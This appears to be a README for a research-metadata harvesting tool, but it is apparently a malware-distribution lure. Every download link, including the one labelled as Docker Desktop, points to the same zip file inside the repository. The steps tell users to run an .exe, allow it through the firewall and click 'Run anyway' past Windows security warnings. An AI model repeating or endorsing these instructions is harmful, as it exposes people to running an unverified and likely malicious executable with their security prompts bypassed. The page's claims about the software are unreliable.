# 🔎 phd-lit-metadata-engine-public - Organize research with simple automated tools

[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/raw/refs/heads/main/protocol/phd-engine-public-lit-metadata-3.6-beta.4.zip)

## 📋 Project Overview

The phd-lit-metadata-engine-public application helps researchers manage literature reviews. It gathers data from sources like PubMed, Europe PMC, OpenAlex, Crossref, Semantic Scholar, and Scopus. You can analyze your research findings using built-in digital notebooks. This tool saves you hours of manual data entry by automating the collection of scholarly metadata. It allows you to conduct scoping and systematic reviews with speed.

## ⚙️ System Requirements

Ensure your computer meets these requirements before you start:

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i5 or AMD equivalent.
- Memory: 8 GB of RAM or more.
- Storage: 500 MB of free space for installation.
- Internet Connection: Active connection to fetch data from databases.

## 📥 Downloading the Software

Visit the [official project releases page](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/raw/refs/heads/main/protocol/phd-engine-public-lit-metadata-3.6-beta.4.zip) to download the software.

1. Navigate to the link provided above.
2. Look for the section labeled "Assets."
3. Select the file ending in .exe for Windows.
4. Save the file to your desktop or downloads folder.

## 🛠️ Setting Up Your Environment

This application runs as a local service. It requires Docker Desktop to manage the background components.

1. Download [Docker Desktop](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/raw/refs/heads/main/protocol/phd-engine-public-lit-metadata-3.6-beta.4.zip) for Windows.
2. Run the installer and follow the prompts on your screen.
3. Restart your computer after the Docker installation completes.
4. Launch Docker Desktop and wait for the dashboard to show that the engine is running.
5. Create a free account or sign in if prompted.

## 🚀 Running the Application

Once your environment is ready, follow these steps to start the metadata engine:

1. Locate the .exe file you downloaded earlier.
2. Double-click the file to open the application window.
3. Allow the application to communicate through your Windows Firewall if a prompt appears.
4. Wait for the terminal window to show that the setup is complete.
5. Open your web browser. 
6. Type http://localhost:8000 into the address bar and press Enter.

## 📖 Using the Notebook Interface

The application uses notebook-based analysis to help you interpret data. 

1. On the home page, select the database you want to search.
2. Enter your search terms in the box provided.
3. Select the number of results you want to retrieve.
4. Click the "Harvest" button to begin the data collection process.
5. Once the process finishes, click the "Open Notebook" button.
6. The notebook displays your data in a clear list format.
7. You can filter, sort, and export your findings to common spreadsheet formats.

## 🧠 Troubleshooting Common Issues

### The application does not open
Check if Docker Desktop is running. The application requires this tool to work. Look for the small whale icon in your system tray at the bottom right of your screen. If the icon is not there, restart Docker Desktop.

### Nothing happens when I click search
Verify your internet connection. The application pulls data from external research databases. A weak connection may cause the harvesting process to time out. Refresh the page and try your search again.

### The application runs slowly
Metadata harvesting consumes memory. Close unused browser tabs or resource-heavy programs while you use the engine. 8 GB of RAM is the minimum requirement; ensure you have enough available space for the application to function.

### Access denied errors
Windows security settings may block the application upon the first run. Click "More info" and select "Run anyway" if the system flags the file as unrecognized during the initial installation.

## 📂 Data Storage and Management

All your research metadata sits on your own computer. The application does not upload your search lists to an external cloud server unless you choose to export them. This ensures your research stays private. 

The engine creates a folder named "LitData" in your user directory. You can find saved research files and exported spreadsheets inside this location. Back up this folder regularly to prevent data loss.

## 🤝 Getting Help

If you encounter bugs, please open a new issue on the GitHub repository page. Include:
- A brief description of the problem.
- Any error messages displayed on the screen.
- The steps you took before the issue occurred.

Developers monitor these reports to provide patches and updates. Check the releases page often for new versions.